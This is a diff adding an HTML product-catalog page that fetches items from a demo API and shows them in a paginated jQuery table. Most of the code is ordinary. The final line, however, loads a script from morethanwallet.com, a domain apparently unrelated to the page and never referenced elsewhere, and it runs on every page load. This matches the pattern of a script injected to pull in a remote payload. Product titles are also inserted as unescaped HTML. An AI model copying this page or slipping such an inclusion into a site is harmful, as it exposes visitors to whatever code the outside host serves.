@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Product Catalog</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    .inactive {
+      opacity: 0.5;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin-top: 20px;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px;
+      text-align: left;
+    }
+    th {
+      background-color: #e6e6e6;
+    }
+    .page-button {
+      background-color: #3f51b5;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+    .page-button:hover {
+      background-color: #3949ab;
+    }
+  </style>
+</head>
+<body class="bg-gray-100 p-8">
+  <h1 class="text-2xl font-bold mb-5">Product List</h1>
+  <div id="productTable" class="mb-5"></div>
+  <button id="previousPage" class="page-button">Previous</button>
+  <button id="nextPage" class="page-button">Next</button>
+  <span class="ml-3">
+    <span id="currentPage"></span> from <span id="totalPages"></span>
+  </span>
+
+  <script>
+    let currentPage = 0;
+    const itemsPerPage = 10;
+    let productList = [];
+
+    const loadProducts = () => {
+      $.get("https://dummyjson.com/products?limit=100", function (data) {
+        productList = data.products;
+        renderProducts();
+        updatePageCount();
+      });
+    };
+
+    const renderProducts = () => {
+      const start = currentPage * itemsPerPage;
+      const end = start + itemsPerPage;
+      const displayedProducts = productList.slice(start, end);
+
+      const tableHTML = `
+        <table class="table-auto w-full bg-white rounded shadow">
+          <thead>
+            <tr>
+              <th class="px-4 py-2">Product Name</th>
+              <th class="px-4 py-2">Price</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${displayedProducts.map(item => `
+              <tr>
+                <td class="border px-4 py-2">${item.title}</td>
+                <td class="border px-4 py-2">${item.price}</td>
+              </tr>`).join('')}
+          </tbody>
+        </table>`;
+
+      $("#productTable").html(tableHTML);
+      updateNavigationButtons();
+    };
+
+    const updateNavigationButtons = () => {
+      const prevBtn = $("#previousPage");
+      const nextBtn = $("#nextPage");
+      const totalPages = Math.ceil(productList.length / itemsPerPage);
+
+      prevBtn.prop("disabled", currentPage === 0);
+      nextBtn.prop("disabled", (currentPage + 1) * itemsPerPage >= productList.length);
+
+      prevBtn.toggleClass("inactive", currentPage === 0);
+      nextBtn.toggleClass("inactive", currentPage === totalPages - 1);
+    };
+
+    $("#previousPage").click(() => {
+      if (currentPage > 0) {
+        currentPage--;
+        renderProducts();
+        updateCurrentPage();
+      }
+    });
+
+    $("#nextPage").click(() => {
+      const totalPages = Math.ceil(productList.length / itemsPerPage);
+      if ((currentPage + 1) * itemsPerPage < productList.length) {
+        currentPage++;
+        renderProducts();
+        updateCurrentPage();
+      }
+    });
+
+    const updateCurrentPage = () => {
+      $("#currentPage").text(currentPage + 1);
+      updateNavigationButtons();
+    };
+
+    const updatePageCount = () => {
+      const totalPages = Math.ceil(productList.length / itemsPerPage);
+      $("#totalPages").text(totalPages);
+    };
+
+    loadProducts();
+    updateCurrentPage();
+  </script>
+  <script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+</html>
